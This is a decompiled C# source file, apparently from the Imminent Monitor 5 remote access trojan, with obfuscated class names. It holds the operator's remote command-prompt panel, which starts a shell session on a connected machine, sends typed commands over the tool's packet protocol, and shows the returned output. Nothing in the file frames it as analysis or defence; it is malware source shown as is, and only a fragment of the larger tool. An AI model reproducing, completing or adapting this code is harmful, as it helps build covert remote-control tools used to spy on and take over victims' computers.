// Decompiled with JetBrains decompiler
// Type: UserControlCommandPrompt
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class UserControlCommandPrompt : UserControl
{
  private IContainer icontainer_0;
  private TextBox textBox_0;
  private GClass29 gclass29_0;
  private GClass18 gclass18_0;

  public UserControlCommandPrompt()
  {
    this.Load += new EventHandler(this.UserControlCommandPrompt_Load);
    this.InitializeComponent();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.vmethod_1(new TextBox());
    this.vmethod_3(new GClass29());
    this.SuspendLayout();
    this.vmethod_0().Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    TextBox textBox1 = this.vmethod_0();
    Point point1 = new Point(3, 459);
    Point point2 = point1;
    textBox1.Location = point2;
    this.vmethod_0().Name = "RichTextBoxCmdEnter";
    TextBox textBox2 = this.vmethod_0();
    Size size1 = new Size(731, 22);
    Size size2 = size1;
    textBox2.Size = size2;
    this.vmethod_0().TabIndex = 2;
    this.vmethod_2().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_2().BackColor = Color.FromArgb(171, 173, 179);
    GClass29 gclass29_1 = this.vmethod_2();
    point1 = new Point(3, 3);
    Point point3 = point1;
    gclass29_1.Location = point3;
    this.vmethod_2().Name = "RichTextBoxCmd";
    this.vmethod_2().method_1((string) null);
    GClass29 gclass29_2 = this.vmethod_2();
    size1 = new Size(731, 450);
    Size size3 = size1;
    gclass29_2.Size = size3;
    this.vmethod_2().TabIndex = 3;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.White;
    this.Controls.Add((Control) this.vmethod_2());
    this.Controls.Add((Control) this.vmethod_0());
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Name = nameof (UserControlCommandPrompt);
    size1 = new Size(736, 483);
    this.Size = size1;
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  internal virtual TextBox vmethod_0() => this.textBox_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(TextBox textBox_1)
  {
    KeyEventHandler keyEventHandler = new KeyEventHandler(this.method_6);
    if (this.textBox_0 != null)
      this.textBox_0.KeyDown -= keyEventHandler;
    this.textBox_0 = textBox_1;
    if (this.textBox_0 == null)
      return;
    this.textBox_0.KeyDown += keyEventHandler;
  }

  internal virtual GClass29 vmethod_2() => this.gclass29_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(GClass29 gclass29_1) => this.gclass29_0 = gclass29_1;

  public GClass18 method_0() => this.gclass18_0;

  public void method_1(GClass18 gclass18_1) => this.gclass18_0 = gclass18_1;

  private void method_2()
  {
    this.method_0().method_20().bool_3 = true;
    this.vmethod_2().richTextBox_0.Text = (string) null;
    object[] object_0 = new object[2]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.CommandPrompt,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.CommandPromptPacket.Start
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  private void method_3()
  {
    this.vmethod_2().richTextBox_0.Text = (string) null;
    object[] object_0 = new object[2]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.CommandPrompt,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.CommandPromptPacket.StopCmd
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  private void method_4()
  {
    object[] object_0 = new object[3]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.CommandPrompt,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.CommandPromptPacket.CmdIn,
      (object) this.vmethod_0().Text
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  public void method_5(object[] object_0)
  {
    if (this.InvokeRequired)
    {
      this.Invoke((Delegate) new Class97.Delegate16(this.method_5), (object) object_0);
    }
    else
    {
      int startIndex = (int) Math.Round(15360.0);
      if (this.vmethod_2().richTextBox_0.Text.Length > 61440)
      {
        int length = this.vmethod_2().richTextBox_0.Text.IndexOf('\n', startIndex) + 1;
        if (length < startIndex)
          length = startIndex;
        this.vmethod_2().richTextBox_0.Select(0, length);
        this.vmethod_2().richTextBox_0.Cut();
      }
      this.vmethod_2().richTextBox_0.AppendText(Conversions.ToString(object_0[2]));
      this.vmethod_2().richTextBox_0.SelectionStart = this.vmethod_2().richTextBox_0.Text.Length;
      this.vmethod_2().richTextBox_0.ScrollToCaret();
    }
  }

  private void UserControlCommandPrompt_Load(object sender, EventArgs e)
  {
    try
    {
      if (this.DesignMode)
        return;
      this.method_2();
      this.vmethod_2().richTextBox_0.Font = new Font("Lucida Console", 8f);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Class97.smethod_0().method_2(exception_0, (string) null);
      ProjectData.ClearProjectError();
    }
  }

  private void method_6(object sender, KeyEventArgs e)
  {
    if (e.KeyCode != Keys.Return)
      return;
    e.SuppressKeyPress = true;
    this.method_4();
    this.vmethod_0().Text = (string) null;
  }

  protected override void OnHandleDestroyed(EventArgs e)
  {
    try
    {
      this.method_0().method_20().bool_3 = false;
      this.method_3();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    base.OnHandleDestroyed(e);
  }
}
